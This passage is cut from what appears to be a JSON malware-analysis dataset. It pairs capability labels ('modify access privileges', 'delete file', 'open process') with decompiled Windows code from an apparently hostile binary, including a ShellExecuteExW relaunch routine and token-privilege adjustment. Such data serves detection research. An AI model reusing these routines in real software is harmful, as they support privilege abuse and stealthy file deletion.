&lpFilename);\n        (*pcVar1)(&lpString1, 0x41034c);\n        var_2ch = &lpBuffer;\n        pExecInfo = 0x3c;\n        var_28h = &lpString1;\n        var_34h = 0;\n        var_30h = L\"Open\";\n        var_24h = 0;\n        var_20h = 0;\n        var_38h = 0x40;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x100);\n        pcVar1 = _sym.imp.KERNEL32.dll_SetPriorityClass;\n        (*_sym.imp.KERNEL32.dll_SetPriorityClass)(uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetCurrentThread;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)(0xf);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar4);\n        (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n        iVar3 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n        if (iVar3 != 0) {\n            (*pcVar1)(hProcess, 0x40);\n            (*_sym.imp.KERNEL32.dll_SetProcessPriorityBoost)(hProcess, 1);\n            (*_sym.imp.SHELL32.dll_SHChangeNotify)(4, 5, &lpFilename, 0);\n            return 1;\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20);\n        (*pcVar1)(uVar4);\n        uVar4 = (*pcVar2)(0);\n        (*_sym.imp.KERNEL32.dll_SetThreadPriority)(uVar4);\n    }\n    return 0;\n}\n",
        "token_count": 785
    },
    "004088cf": {
        "rules": [
            "open process",
            "check process job object/8aaf725824be4e7b84101cffc1f879ea"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004088cf(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (iVar1 != 0) {\n        iVar2 = fcn.004062df();\n        if (iVar2 != 0) {\n            iVar4 = fcn.00408bec();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return iVar4 == 0;\n}\n",
        "token_count": 186
    },
    "00405c06": {
        "rules": [
            "query environment variable"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.00405c06(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint nSize;\n    uint var_4h;\n    \n    puVar4 = NULL;\n    if ((param_1 != 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, 0, 0),  iVar1 != 0)) {\n        iVar3 = iVar1 * 2 + 8;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, iVar3);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar5 = puVar4;\n        if (puVar4 != NULL) {\n            for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            iVar1 = (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(param_1, puVar4, iVar1);\n            if (iVar1 == 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = NULL;\n            }\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 337
    },
    "0040b2ab": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040b2ab(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpLuid;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    TokenHandle = param_2;\n    if (param_2 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n        if (iVar2 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n            iVar2 = 0;\n            if (iVar1 != 0) {\n                var_18h = lpLuid;\n                var_14h = var_8h;\n                NewState = 1;\n                var_10h = 2;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, param_1, &lpLuid);\n        iVar2 = 0;\n        if (iVar1 != 0) {\n            var_18h = lpLuid;\n            var_14h = var_8h;\n            NewState = 1;\n            var_10h = 2;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0x10, 0, 0);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 453
    },
    "004058c9": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004058c9(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    \n    uVar4 = 0;\n    iVar1 = fcn.00405c06();\n    if (iVar1 != 0) {\n        param_1 = iVar1;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(param_1);\n    if (iVar2 == 0) {\n        uVar4 = fcn.0040e896();\n    }\n    if (iVar1 != 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar1);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return uVar4;\n}\n",
        "token_count": 189
    }
}